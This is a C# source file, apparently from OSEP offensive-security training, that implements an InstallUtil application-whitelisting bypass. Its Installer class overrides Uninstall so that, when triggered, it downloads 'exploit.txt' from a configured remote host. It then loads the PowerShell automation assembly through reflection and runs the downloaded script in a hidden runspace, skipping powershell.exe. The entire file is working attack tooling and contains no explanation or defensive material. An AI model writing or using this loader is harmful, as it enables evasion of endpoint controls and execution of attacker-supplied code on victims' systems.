using System;
using System.Configuration.Install;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public async override void Uninstall(System.Collections.IDictionary savedState)
        {
            Debug.RunDebug("\nUninstall bypass started.");

            byte[] fileBytes = await DownloadFileAsync($"{CONFIG.HTTP_URL}/exploit.txt");

            string script = Encoding.UTF8.GetString(fileBytes);



            Assembly sma;

            string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string[] locations = {
                Path.Combine(windir, @"System32\WindowsPowerShell\v1.0\System.Management.Automation.dll"),
                Path.Combine(windir, @"SysWOW64\WindowsPowerShell\v1.0\System.Management.Automation.dll"),
                @"C:\Program Files\PowerShell\7\System.Management.Automation.dll",
                @"C:\Program Files\PowerShell\7-preview\System.Management.Automation.dll"
            };

            string dllPath = locations.FirstOrDefault(File.Exists);

            if (dllPath != null)
            {
                sma = Assembly.LoadFrom(dllPath);
            }
            else
            {
                sma = Assembly.Load(
                "System.Management.Automation, " +
                "Version=3.0.0.0, " +
                "Culture=neutral, " +
                "PublicKeyToken=31bf3856ad364e35");
            }

            if (sma == null) { Environment.Exit(0); }


            Type runspaceFactoryType = sma.GetType("System.Management.Automation.Runspaces.RunspaceFactory", throwOnError: true);

            Type powerShellType = sma.GetType("System.Management.Automation.PowerShell", throwOnError: true);

            object runspace = runspaceFactoryType.GetMethod("CreateRunspace", Type.EmptyTypes).Invoke(null, null);
            object powerShell = powerShellType.GetMethod("Create", Type.EmptyTypes).Invoke(null, null);

            runspace.GetType().GetMethod("Open", Type.EmptyTypes).Invoke(runspace, null);

            powerShellType.GetProperty("Runspace").SetValue(powerShell, runspace, null);



            powerShellType.GetMethod("AddScript", new[] { typeof(string) }).Invoke(powerShell, new object[] { script });

            MethodInfo invokeMethod = powerShellType
            .GetMethods(BindingFlags.Public | BindingFlags.Instance)
            .Single(method =>
                method.Name == "Invoke" &&
                !method.IsGenericMethod &&
                method.GetParameters().Length == 0);

                invokeMethod.Invoke(powerShell, null);



            (powerShell as IDisposable)?.Dispose();
            (runspace as IDisposable)?.Dispose();
        }

        public static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (var client = new HttpClient())
            {
                return await client.GetByteArrayAsync(url);
            }
        }
    }
}